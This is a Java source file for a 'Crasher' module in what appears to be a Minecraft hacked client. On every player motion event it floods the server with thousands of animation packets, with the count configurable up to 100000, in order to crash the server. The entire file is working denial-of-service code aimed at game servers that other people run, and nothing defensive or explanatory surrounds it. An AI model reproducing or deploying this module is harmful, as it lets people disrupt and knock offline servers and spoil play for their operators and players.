package cn.tianyu.client.module.impl.misc;

import cn.tianyu.client.event.EventTarget;
import cn.tianyu.client.event.events.game.EventMotion;
import cn.tianyu.client.module.Category;
import cn.tianyu.client.module.Module;
import cn.tianyu.client.value.impl.NumberValue;
import net.minecraft.network.play.client.C0APacketAnimation;

/**
 * @Author: CN_tianyu
 */
public class Crasher extends Module {

    private final NumberValue numberSetting = new NumberValue("Packet Amount", 10000, 100000, 1000, 1);

    public Crasher(){
        super("Crasher","Crasher", Category.misc);
    }
    @EventTarget
    public void onMotionEvent(EventMotion event) {
        for (int i = 0; i < numberSetting.getValue(); i++) {
            mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
        }
    }
}
